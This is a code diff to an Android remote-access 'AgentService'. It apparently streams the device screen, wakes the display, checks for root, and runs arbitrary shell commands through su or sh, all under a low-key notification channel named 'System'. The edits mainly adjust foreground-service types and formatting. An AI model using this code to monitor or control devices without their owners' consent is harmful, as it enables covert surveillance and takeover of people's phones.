@@ -5,6 +5,8 @@ import android.app.*;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
+import android.graphics.Point;
 import android.os.*;
 import android.util.Base64;
 import okhttp3.*;
@@ -42,8 +44,10 @@ public class AgentService extends Service {
         NotificationManager nm = getSystemService(NotificationManager.class);
         if (Build.VERSION.SDK_INT >= 26)
             nm.createNotificationChannel(new NotificationChannel("arpit", "System", NotificationManager.IMPORTANCE_LOW));
+
         PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, ConnectActivity.class),
                 PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
+
         Notification n = (Build.VERSION.SDK_INT >= 26
                 ? new Notification.Builder(this, "arpit")
                 : new Notification.Builder(this))
@@ -53,7 +57,17 @@ public class AgentService extends Service {
                 .setOngoing(true)
                 .setContentIntent(pi)
                 .build();
-        startForeground(77, n);
+
+        int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+        if (Build.VERSION.SDK_INT >= 34 && projectionData != null)
+            type = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+
+        try {
+            if (Build.VERSION.SDK_INT >= 29) startForeground(77, n, type);
+            else startForeground(77, n);
+        } catch (Exception e) {
+            try { startForeground(77, n); } catch (Exception ignored) {}
+        }
     }
 
     @Override public int onStartCommand(Intent i, int f, int s) {
@@ -70,8 +84,13 @@ public class AgentService extends Service {
             return;
         }
 
+        note();
+
         Point sz = new Point();
-        try { ((android.view.WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getRealSize(sz); } catch (Exception e) {}
+        try {
+            ((android.view.WindowManager) getSystemService(WINDOW_SERVICE))
+                    .getDefaultDisplay().getRealSize(sz);
+        } catch (Exception e) {}
         if (sz.x > 0) { Agent.W = sz.x; Agent.H = sz.y; }
 
         streamer = new ScreenStreamer(this, (jpeg, w, h) -> {
@@ -154,7 +173,9 @@ public class AgentService extends Service {
     }
 
     private boolean root() {
-        try { return new File("/system/xbin/su").exists() || new File("/system/bin/su").exists(); } catch (Exception e) { return false; }
+        try {
+            return new File("/system/xbin/su").exists() || new File("/system/bin/su").exists();
+        } catch (Exception e) { return false; }
     }
 
     /* ---------- commands ---------- */
@@ -211,14 +232,16 @@ public class AgentService extends Service {
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         if (pm.isInteractive()) return;
         try {
-            WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "arpit");
+            PowerManager.WakeLock wl = pm.newWakeLock(
+                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "arpit");
             wl.acquire(4000);
         } catch (Exception ignored) {}
     }
 
     private String shell(String cmd) {
         try {
-            Process p = Runtime.getRuntime().exec(root() ? new String[]{"su", "-c", cmd} : new String[]{"sh", "-c", cmd});
+            java.lang.Process p = Runtime.getRuntime().exec(
+                    root() ? new String[]{"su", "-c", cmd} : new String[]{"sh", "-c", cmd});
             BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
             StringBuilder sb = new StringBuilder();
             String l;
@@ -254,4 +277,4 @@ public class AgentService extends Service {
     }
 
     @Override public IBinder onBind(Intent i) { return null; }
-            }
+}
